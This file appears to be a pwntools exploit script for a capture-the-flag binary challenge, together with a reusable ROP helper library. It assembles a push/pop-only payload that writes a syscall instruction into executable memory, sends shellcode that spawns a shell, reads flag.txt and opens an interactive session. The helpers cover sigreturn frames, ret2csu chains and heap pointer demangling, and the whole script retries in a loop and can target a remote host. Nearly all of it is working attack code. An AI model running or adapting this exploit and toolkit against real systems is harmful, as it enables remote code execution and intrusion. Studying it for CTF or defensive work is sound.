from typing import Literal
from ctypes import CDLL
import os
import pwn

os.chdir(os.path.dirname(__file__))
pwn.context.log_level = "debug"
use_patched: bool = False
exe_path = "binary" if (not use_patched) else "debug/binary_patched"
gdbscript: str = """
	brva 0x1920
	c
"""

def exploit():
	exe = pwn.context.binary = pwn.ELF(exe_path)
	libc = exe.libc
	if (libc and pwn.context.arch == "amd64"):
		cdll = CDLL(libc.path)

	# <interactions>

	with connect(
		[exe.path], "localhost", "1090",
		gdbscript, ssl=False,
		default_mode="local",
	) as io:

		# /////
		# Exploit here
		# /////

		def pop(reg: str):
			return f"pop {reg}"
	
		def push(reg: str):
			return f"push {reg}"


		# Stack upon code, because i can modify the code already executed
		# This exploit needs mmap & 0xf000 == 0xa000

		# RBP: used in legal executable instruction for padding
		# BX: valid even SP
		# CX: valid odd SP
		# DX: 0x050f == b"\x0f\x05" (syscall)
		# RSI: mmap reference
		# R8: bytes of legal executable instructions

		code = [
			*[pop("rbp"), push("rbp")]*(0x8 // 2), # trick to increase rip keeping rsp where it is without messing up the execution
			pop("r8"), # 2-byte inst of 8-byte reg, store byte of legal instrution
			push("fs"), # store 0xa00f at 0xa00a

			pop("rbp"), # SP = 0xa008

			push("sp"),
			pop("bx"), # BX = 0xa008

			pop("bp"), # skip pop r8 bytes
			pop("sp"), # SP = 0xa00f

			push("sp"),
			pop("cx"), # CX = 0xa00f

			*[push("bp")]*(0xa // 2), # SP = 0xa005

			push("sp"),
			pop("dx"), # DX = 0xa005

			pop("bp"), # SP = 0xa007
			push("cx"), # store 0x0f at 0xa005

			push("bx"),
			pop("sp"), # SP = 0xa008

			push("dx"), # store 0x05 at 0xa006

			pop("bp"), # SP = 0xa008
			pop("bp"), # SP = 0xa00a
			push("dx"),
			pop("sp"), # SP = 0xa005
			pop("dx"), # DX = 0x050f == b"\x0f\x05" (syscall), SP = 0xa007, RIP = 0xa03b

			*[pop("rbp")]*(0x50 // 8), # move RSP under the code, SP = 0xa057

			push("rsp"),
			pop("rsi"), # SI = 0xa057 (here I will write my shellcode)

			push("dx"), # put syscall ready to be executed, SP = 0xa055
			push("r8"), # restore legal executable instructions above 0xa055
			push("r8"), # restore legal executable instructions above 0xa04d
		]
		payload1 = pwn.asm("\n".join(code))
		print(hex(len(payload1)))
		payload1 = payload1.ljust(0xf7, pwn.asm(pop("rbp")))

		io.sendlineafter(b"> ", payload1.hex().encode())
		
		io.sendline(pwn.asm(pwn.shellcraft.sh()))

		io.sendline(b"cat flag.txt")
		io.recvline()
		io.interactive()


def main():
	while True:
		try:
			exploit()
		except Exception:
			pass


def connect(
		args: list[str], hostname: str, port: int | str,
		gdbscript: str = '', ssl: bool = False, add_env: dict[str, str] = {},
		default_mode: Literal["remote", "local", "gdb"] = "local",
	) -> pwn.tube:

	if pwn.args.LOCAL:
		mode = "local"
	elif pwn.args.GDB:
		mode = "gdb"
	elif pwn.args.REMOTE:
		mode = "remote"
	else:
		mode = default_mode

	env = os.environ.copy()
	env.update(add_env)

	if mode == "remote":
		io = pwn.remote(hostname, port, ssl=ssl)
	elif mode == "local":
		io = pwn.process(argv=args, env=env)
	elif mode == "gdb":
		io = pwn.gdb.debug(args=args, gdbscript=gdbscript)
	else:
		raise ValueError("Unknown mode")

	return io


def protect_ptr(pos, ptr):
	return (pos >> 12) ^ ptr

def decrypt_ptr(val):
    mask = 0xfff << (64-12)
    while mask:
        v = val & mask
        val ^= v >> 12
        mask >>= 12
    return val


class ROP(pwn.ROP):
	def __init__(self, *elfs: pwn.ELF, base: int | None = None, badchars: bytes = b'') -> None:

		# Dict for already found string
		self.string_addr = {}

		# Init a cyclic generator for padding without badchars
		self.pad_generator = pwn.cyclic_gen(alphabet=pwn.context.cyclic_alphabet.translate(None, delete=badchars))

		# Include in ROP only the elf with known base address
		elfs = [elf for elf in elfs if isinstance(elf, pwn.ELF) and elf.address]

		super().__init__(elfs, base, badchars)

	def pad(self, length: int, pattern: bytes = b'') -> None:
		"""Insert some padding character of the given length, using a certain pattern if given"""

		if pattern:
			self.raw((pattern * (length//len(pattern) + 1))[:length])
		else:
			self.raw(self.pad_generator.get(length))

	def add_ret(self) -> None:
		"""Add a ret to align the stack pointer"""

		self.raw(self.ret.address)

	def have_badchar(self, value) -> bytes:
		"""Check if any byte of the value is not a bad char"""

		for byte in pwn.flat(value):
			if byte in self._badchars:
				return byte.to_bytes()
		return b''
	
	def resolve(self, resolvable):
		"""Resolve a symbol to an address"""

		addr = super().resolve(resolvable)
		if badchar := self.have_badchar(addr):
			raise ValueError(f"The address of {resolvable} have the badchar {badchar}")
		return addr

	def resolve_value(self, value) -> int:
		"""Transform a value from the supported type in integer"""

		# Transform string into bytes with ending nullbyte
		if isinstance(value, str):
			value = value.encode()
			if value[-1] != 0:
				value += b'\0'

		elif value is None:
			value = 0

		# Search bytes in the elfs, returning the address
		if isinstance(value, bytes):
			if value in self.string_addr:
				return self.string_addr[value]

			for elf in self.elfs:
				for addr in elf.search(value):
					if not self.have_badchar(addr):
						self.string_addr[value] = addr
						return addr
					
			raise ValueError(f"Cannot find an address of the string {value} without badchars")
		
		elif isinstance(value, int):
			if badchar := self.have_badchar(value):
				raise ValueError(f"The value {value} have the badchar {badchar}")
			return value
		
		raise TypeError(f"Unsupported type {type(value)} of the value {value}")
   
	def call(self, resolvable, *arguments) -> None:
		"""Call an address with given arguments"""

		args = [self.resolve_value(arg) for arg in arguments]
		super().call(self.resolve(resolvable), args)

	def system_call(self, syscall: int, *arguments) -> None:
		"""Call the given systemcall with arguments"""

		if badchar := self.have_badchar(syscall):
			raise ValueError(f"Syscall {syscall} have the badchar {badchar}")
		
		self(rax=syscall)
		self.call(self.syscall.address, *arguments)

	def sigreturn(self, registers: dict):
		"""Do a sigreturn with the given registers"""

		# Handle symbols in the 'rip' register
		if 'rip' in registers:
			registers['rip'] = self.resolve(registers['rip'])

		# Handle syscall in the 'rax' register if 'rip' is not setted
		elif 'rax' in registers:
			registers['rip'] = self.syscall.address

		# Build sigreturn frame
		frame = pwn.SigreturnFrame()
		for reg, value in registers.items():
			frame[reg] = self.resolve_value(value)

		self.system_call(pwn.constants.SYS_rt_sigreturn)
		self.raw(bytes(frame))

	def ret2csu(self, edi=0, rsi=0, rdx=0, rbx=0, rbp=0, r12=0, r13=0, r14=0, r15=0, call=None):
		"""Do a ret2csu with the given registers"""

		regs = [self.resolve_value(reg) for reg in (edi, rsi, rdx, rbx, rbp, r12, r13, r14, r15)]
		super().ret2csu(*regs, call)


if __name__ == "__main__":
	# Personalize this
	if os.getenv("WSL_DISTRO_NAME"):
		terminal_settings = ["wt.exe", "-w", "0"]
		if "WT_SESSION" in os.environ: terminal_settings += ["sp"]
		terminal_settings += ["wsl", "--cd", os.path.abspath(os.curdir), "-d", os.getenv("WSL_DISTRO_NAME")]
		pwn.context.terminal = terminal_settings

	main()
